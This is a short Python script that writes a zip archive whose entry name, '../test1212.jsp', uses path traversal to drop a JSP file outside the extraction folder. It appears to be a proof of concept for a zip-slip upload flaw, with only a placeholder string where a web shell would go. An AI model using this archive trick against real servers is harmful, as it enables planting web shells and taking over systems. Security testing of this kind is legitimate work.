import zipfile

shell_name = 'test1212.jsp'
shell_name_zip = '../' + shell_name
zip_file_name = "TEST1212.zip"
shell_content = r'TEST1212'

def make_zip_file():
    zf = zipfile.ZipFile(zip_file_name, mode='a', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(shell_name_zip, shell_content)

make_zip_file()